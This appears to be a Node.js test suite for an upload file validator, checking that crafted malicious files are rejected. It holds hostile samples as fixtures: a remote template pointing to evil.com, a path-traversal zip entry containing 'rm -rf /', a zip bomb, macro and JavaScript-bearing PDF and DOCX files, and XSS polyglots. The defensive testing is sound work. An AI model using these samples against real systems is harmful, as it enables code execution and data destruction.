"use strict";

const test = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const path = require("path");
const os = require("os");
const zlib = require("zlib");
const {
  validateUploadedFileContent,
  validatePdfStructure,
  validateOoxmlStructure,
  validateGenericZip,
  validateOleStructure,
  validateImageStructure,
  validateTextStructure,
} = require("../src/utils/fileValidation");

// Helper to create valid zip archives in memory
function buildZipBuffer(files) {
  const localHeaders = [];
  const centralHeaders = [];
  let currentOffset = 0;

  for (const f of files) {
    const nameBuf = Buffer.from(f.name, "utf8");
    const dataBuf = f.data ? Buffer.from(f.data) : Buffer.alloc(0);
    const method = f.method !== undefined ? f.method : 0; // 0 = stored
    const compSize = f.compressedSize !== undefined ? f.compressedSize : dataBuf.length;
    const uncompSize = f.uncompressedSize !== undefined ? f.uncompressedSize : dataBuf.length;

    // Local Header (30 bytes + name + data)
    const lh = Buffer.alloc(30 + nameBuf.length + dataBuf.length);
    lh.writeUInt32LE(0x04034b50, 0); // signature
    lh.writeUInt16LE(20, 4); // version needed
    lh.writeUInt16LE(0, 6); // flags
    lh.writeUInt16LE(method, 8); // method
    lh.writeUInt16LE(0, 10); // time
    lh.writeUInt16LE(0, 12); // date
    lh.writeUInt32LE(0, 14); // crc
    lh.writeUInt32LE(compSize, 18);
    lh.writeUInt32LE(uncompSize, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28); // extra len
    nameBuf.copy(lh, 30);
    if (dataBuf.length > 0) {
      dataBuf.copy(lh, 30 + nameBuf.length);
    }
    localHeaders.push(lh);

    // Central Directory Header (46 bytes + name)
    const cd = Buffer.alloc(46 + nameBuf.length);
    cd.writeUInt32LE(0x02014b50, 0); // signature
    cd.writeUInt16LE(20, 4); // made by
    cd.writeUInt16LE(20, 6); // needed
    cd.writeUInt16LE(0, 8); // flags
    cd.writeUInt16LE(method, 10); // method
    cd.writeUInt16LE(0, 12); // time
    cd.writeUInt16LE(0, 14); // date
    cd.writeUInt32LE(0, 16); // crc
    cd.writeUInt32LE(compSize, 20);
    cd.writeUInt32LE(uncompSize, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt16LE(0, 30); // extra len
    cd.writeUInt16LE(0, 32); // comment len
    cd.writeUInt16LE(0, 34); // disk num
    cd.writeUInt16LE(0, 36); // internal attr
    cd.writeUInt32LE(0, 38); // external attr
    cd.writeUInt32LE(currentOffset, 42); // local header offset
    nameBuf.copy(cd, 46);
    centralHeaders.push(cd);

    currentOffset += lh.length;
  }

  const cdTotalSize = centralHeaders.reduce((acc, h) => acc + h.length, 0);
  const cdOffset = currentOffset;

  // EOCD (22 bytes)
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(cdTotalSize, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...localHeaders, ...centralHeaders, eocd]);
}

// Clean valid PDF template
const VALID_PDF_CONTENT = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [] /Count 0 >>
endobj
xref
0 3
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
trailer
<< /Size 3 /Root 1 0 R >>
startxref
115
%%EOF`;

test("PART 4 UPLOAD VALIDATION SUITE: Structural validation and crafted file tests", async (t) => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "rca-part4-test-"));

  t.after(() => {
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch (_) {}
  });

  await t.test("4.1 Valid PDF with modified extension derives genuine extension", async () => {
    const filePath = path.join(tmpDir, "sample.doc");
    fs.writeFileSync(filePath, Buffer.from(VALID_PDF_CONTENT, "latin1"));

    const result = validateUploadedFileContent(filePath, "sample.doc", "application/msword", [
      ".pdf",
      ".doc",
      ".docx",
    ]);

    assert.strictEqual(result.valid, true);
    assert.strictEqual(result.detectedType, "pdf");
    assert.strictEqual(result.detectedExt, ".pdf");
    assert.strictEqual(result.detectedMime, "application/pdf");
    assert.strictEqual(result.extensionMismatch, true);
  });

  await t.test("4.2 Polyglot HTML/script with PDF header is rejected", async () => {
    const polyglot = `%PDF-1.4\n<html><body><script>alert('xss')</script></body></html>\n%%EOF`;
    const filePath = path.join(tmpDir, "polyglot.pdf");
    fs.writeFileSync(filePath, Buffer.from(polyglot, "latin1"));

    const result = validateUploadedFileContent(filePath, "polyglot.pdf", "application/pdf");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("polyglot"));
  });

  await t.test("4.3 PDF containing JavaScript action is rejected", async () => {
    const jsPdf = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [] /Count 0 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert("pwned")) >>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000073 00000 n 
0000000122 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
190
%%EOF`;
    const filePath = path.join(tmpDir, "jspdf.pdf");
    fs.writeFileSync(filePath, Buffer.from(jsPdf, "latin1"));

    const result = validateUploadedFileContent(filePath, "jspdf.pdf", "application/pdf");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("javascript"));
  });

  await t.test("4.4 DOCX with macro (vbaProject.bin) is rejected", async () => {
    const zipBuf = buildZipBuffer([
      { name: "[Content_Types].xml", data: '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>' },
      { name: "_rels/.rels", data: '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>' },
      { name: "word/document.xml", data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"></w:document>' },
      { name: "word/vbaProject.bin", data: "fake macro data" },
    ]);

    const filePath = path.join(tmpDir, "macro.docx");
    fs.writeFileSync(filePath, zipBuf);

    const result = validateUploadedFileContent(filePath, "macro.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("macro"));
  });

  await t.test("4.5 OOXML with external relationship target is rejected", async () => {
    const relsWithExternal = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.com/template.dotm" TargetMode="External"/>
</Relationships>`;

    const zipBuf = buildZipBuffer([
      { name: "[Content_Types].xml", data: '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>' },
      { name: "_rels/.rels", data: relsWithExternal },
      { name: "word/document.xml", data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"></w:document>' },
    ]);

    const filePath = path.join(tmpDir, "external_rels.docx");
    fs.writeFileSync(filePath, zipBuf);

    const result = validateUploadedFileContent(filePath, "external_rels.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("external relationship"));
  });

  await t.test("4.6 Zip bomb with high compression ratio is rejected", async () => {
    const zipBuf = buildZipBuffer([
      {
        name: "bomb.txt",
        data: "small",
        compressedSize: 5,
        uncompressedSize: 50 * 1024 * 1024, // 50MB declared vs 5 bytes compressed (> 50:1 ratio)
      },
    ]);

    const filePath = path.join(tmpDir, "bomb.zip");
    fs.writeFileSync(filePath, zipBuf);

    const result = validateUploadedFileContent(filePath, "bomb.zip", "application/zip");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("ratio") || result.error.toLowerCase().includes("bomb"));
  });

  await t.test("4.7 Zip with path traversal (../../evil.sh) is rejected", async () => {
    const zipBuf = buildZipBuffer([
      { name: "../../evil.sh", data: "#!/bin/sh\nrm -rf /" },
    ]);

    const filePath = path.join(tmpDir, "traversal.zip");
    fs.writeFileSync(filePath, zipBuf);

    const result = validateUploadedFileContent(filePath, "traversal.zip", "application/zip");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("path traversal"));
  });

  await t.test("4.8 Executable renamed to .pdf (MZ header) is rejected", async () => {
    const exeBuf = Buffer.alloc(100);
    exeBuf[0] = 0x4d; // 'M'
    exeBuf[1] = 0x5a; // 'Z'
    const filePath = path.join(tmpDir, "fake_doc.pdf");
    fs.writeFileSync(filePath, exeBuf);

    const result = validateUploadedFileContent(filePath, "fake_doc.pdf", "application/pdf");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("executable"));
  });

  await t.test("4.9 SVG image upload is rejected", async () => {
    const svgContent = `<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`;
    const filePath = path.join(tmpDir, "image.svg");
    fs.writeFileSync(filePath, Buffer.from(svgContent, "utf8"));

    const result = validateUploadedFileContent(filePath, "image.svg", "image/svg+xml");
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.toLowerCase().includes("svg"));
  });

  await t.test("4.10 Valid PDF, DOCX, PNG, and TXT files are accepted", async () => {
    // 1. Valid PDF
    const pdfPath = path.join(tmpDir, "valid.pdf");
    fs.writeFileSync(pdfPath, Buffer.from(VALID_PDF_CONTENT, "latin1"));
    const pdfRes = validateUploadedFileContent(pdfPath, "valid.pdf", "application/pdf");
    assert.strictEqual(pdfRes.valid, true);
    assert.strictEqual(pdfRes.detectedType, "pdf");
    assert.strictEqual(pdfRes.detectedExt, ".pdf");

    // 2. Valid DOCX
    const docxBuf = buildZipBuffer([
      { name: "[Content_Types].xml", data: '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>' },
      { name: "_rels/.rels", data: '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>' },
      { name: "word/document.xml", data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"></w:document>' },
    ]);
    const docxPath = path.join(tmpDir, "valid.docx");
    fs.writeFileSync(docxPath, docxBuf);
    const docxRes = validateUploadedFileContent(docxPath, "valid.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
    assert.strictEqual(docxRes.valid, true);
    assert.strictEqual(docxRes.detectedType, "docx");
    assert.strictEqual(docxRes.detectedExt, ".docx");

    // 3. Valid PNG (standard 1x1 transparent pixel PNG)
    const pngBuf = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
    const pngPath = path.join(tmpDir, "valid.png");
    fs.writeFileSync(pngPath, pngBuf);
    const pngRes = validateUploadedFileContent(pngPath, "valid.png", "image/png");
    assert.strictEqual(pngRes.valid, true);
    assert.strictEqual(pngRes.detectedType, "png");
    assert.strictEqual(pngRes.detectedExt, ".png");

    // 4. Valid TXT
    const txtContent = "Clean plain text document notes without any scripts.";
    const txtPath = path.join(tmpDir, "notes.txt");
    fs.writeFileSync(txtPath, Buffer.from(txtContent, "utf8"));
    const txtRes = validateUploadedFileContent(txtPath, "notes.txt", "text/plain");
    assert.strictEqual(txtRes.valid, true);
    assert.strictEqual(txtRes.detectedType, "text");
    assert.strictEqual(txtRes.detectedExt, ".txt");
  });

  await t.test("4.11 File delivery sets restrictive CSP, nosniff, and safe disposition", async () => {
    const { serveUpload } = require("../src/controllers/uploadController");
    const { UPLOADS_DIR } = require("../src/config/env");

    const testFile = "test_serve_security.pdf";
    const testPath = path.join(UPLOADS_DIR, testFile);
    fs.writeFileSync(testPath, "%PDF-1.4\n%%EOF");

    const headers = {};
    const mockRes = {
      setHeader(k, v) { headers[k] = v; },
      sendFile(f) { this.sentFile = f; return this; },
      status(s) { this.statusCode = s; return this; },
      json(j) { this.body = j; return this; },
    };

    try {
      await serveUpload({ params: { filename: testFile } }, mockRes);
      assert.strictEqual(headers["X-Content-Type-Options"], "nosniff");
      assert.ok(headers["Content-Security-Policy"].includes("sandbox"));
      assert.ok(headers["Content-Security-Policy"].includes("frame-ancestors"));
      assert.ok(headers["Content-Disposition"].startsWith("inline"));
    } finally {
      if (fs.existsSync(testPath)) fs.unlinkSync(testPath);
    }
  });
});

